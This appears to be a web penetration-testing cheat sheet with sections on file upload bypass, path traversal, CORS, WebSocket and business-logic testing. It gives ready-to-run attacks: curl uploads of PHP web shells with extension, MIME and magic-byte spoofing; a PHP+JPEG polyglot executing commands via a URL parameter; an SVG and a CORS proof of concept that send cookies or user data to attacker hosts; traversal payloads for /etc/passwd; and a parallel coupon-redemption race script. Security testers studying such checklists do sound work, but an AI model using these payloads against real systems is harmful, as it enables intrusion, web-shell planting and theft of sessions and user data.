2File Upload

For every upload endpoint: identify all client-side and server-side checks, then bypass each one in turn.

Upload bypass test battery (curl)TARGET=https://example.com/api/upload
COOKIE="session=..."

# 1. Plain .php (baseline / often blocked)
curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.php"

# 2. Double-extension
curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.php.jpg;type=image/jpeg"

# 3. Uncommon extension
curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.phtml;type=image/jpeg"

# 4. MIME spoof — keep payload, lie about type
curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.php;type=image/jpeg"

# 5. Magic-byte spoof (prepend GIF header)
printf 'GIF89a;
' > gifphp.gif.php
cat shell.php >> gifphp.gif.php
curl -X POST $TARGET -b "$COOKIE" -F "file=@gifphp.gif.php"

# 6. Filename traversal
curl -X POST $TARGET -b "$COOKIE" -F "file=@shell.php;filename=../shell.php"
SVG with embedded XSS (stored if rendered inline)cat &gt; xss.svg &lt;&lt;'EOF'
&lt;?xml version="1.0" standalone="no"?&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://collab/?'+document.cookie)"&gt;
  &lt;text x="10" y="20"&gt;hi&lt;/text&gt;
&lt;/svg&gt;
EOF
curl -X POST $TARGET -F "file=@xss.svg;type=image/svg+xml"
PHP+JPEG polyglot via exiftoolcp clean.jpg poly.jpg
exiftool -Comment='&lt;?php system($_GET["c"]); ?&gt;' poly.jpg
mv poly.jpg poly.php.jpg
curl -X POST $TARGET -F "file=@poly.php.jpg"
# Then visit: https://example.com/uploads/poly.php.jpg?c=id
  • Identify client-side checks (JS validation, accept attribute) — bypass by tampering the request directly
  • Extension allow/blocklist: try .phtml, .php5, .php7, .shtml, .htaccess, .jsp
  • Double extension: shell.php.jpg, shell.jpg.php, shell.php%00.jpg
  • MIME type spoofing: keep payload, change Content-Type: image/jpeg
  • Magic-byte spoofing: prepend GIF89a; or %PDF-1.4 before the payload
  • SVG with embedded JS: <svg xmlns="..."><script>alert(1)</script></svg> — stored XSS if rendered inline
  • Polyglot (PHP+JPEG, PHP+GIF) — exiftool with -Comment="<?php ... ?>"
  • Filename path-traversal: ../shell.php, ..\shell.aspx
  • If accepts ZIP: zip-slip (../../../tmp/x) or zipbomb
  • Where does the file land? Public dir? Executable by web server? Direct URL to it?
  • Size limit: try 10 GB upload to test rate-limit / DoS handling

  • List every path-typed parameter (?file=, ?page=, ?include=, ?template=)
  • Basic: ../../../etc/passwd, ..\..\..\windows\win.ini
  • URL-encoded: ..%2f..%2f..%2fetc%2fpasswd
  • Double-encoded: ..%252f..%252fetc%252fpasswd
  • Unicode bypass: ..%c0%afetc%c0%afpasswd · ..%c1%9c

  • ....// · ...%2f...%2f (filter strips ../)
  • Absolute paths: /etc/passwd (server may concatenate to base dir)
  • Try Remote File Inclusion (RFI): http://attacker.com/shell.txt

4CORS

CORS reflection probeAPI=https://example.com/api/me
COOKIE="session=..."
for origin in \
    "https://attacker.com" \
    "null" \
    "https://example.com.attacker.com" \
    "https://eviltarget.com" \
    "http://example.com" ; do
  echo "=== Origin: $origin ==="
  curl -sk -o /dev/null -D - $API -b "$COOKIE" \
    -H "Origin: $origin" \
    | grep -iE "access-control"
done
PoC HTML for confirmed CORS leak&lt;script&gt;
fetch("https://example.com/api/me", {credentials:"include"})
  .then(r =&gt; r.text())
  .then(t =&gt; fetch("https://attacker.com/log?d=" + btoa(t)));
&lt;/script&gt;
  • List every API endpoint that returns user data (these are the targets)
  • Test for full reflection: Origin: https://evil.com → Access-Control-Allow-Origin: https://evil.com
  • If reflected, check Access-Control-Allow-Credentials: true — = critical
  • Test Origin: null (sandboxed iframe / data:URL exploit path)
  • Prefix bypass: Origin: https://target.com.evil.com
  • Suffix bypass: Origin: https://eviltarget.com
  • Subdomain trust + XSS on a low-trust subdomain
  • Cleartext-trust: http://target.com reflected on an HTTPS API?

  • Inject XSS / SQLi / CMDi payloads into WebSocket messages

6Business Logic

High-impact bugs that don't fit any vuln class — pure logic abuse.

Race-condition probe (Burp Repeater "send group in parallel" or Turbo Intruder)# Burp Pro: arrange request in Repeater tab, "Send group in parallel".
# Free alternative — sniped Python with httpx:
import asyncio, httpx
URL  = "https://example.com/api/redeem"
TKN  = "Bearer ..."
DATA = {"code": "SAVE10"}
async def fire(c, i):
    r = await c.post(URL, json=DATA, headers={"Authorization": TKN})
    print(i, r.status_code, r.json())
async def main():
    async with httpx.AsyncClient(http2=True) as c:
        await asyncio.gather(*(fire(c, i) for i in range(40)))
asyncio.run(main())
  • Coupon / discount code: reuse, stacking, application after total calc, negative values
  • Negative quantity (refund-as-purchase), zero quantity, fractional quantity
  • Race window on purchase / transfer / vote / 2FA-attempt — Turbo Intruder 50× parallel
  • Currency / decimal manipulation (amount=1.999 rounds down server-side?)
  • State machine skip: jump from step 1 → step 4 in a multi-step flow
  • Self-target: send money / vote / friend-request to yourself
  • Hidden-field tampering on update: "is_admin":true, "verified":true
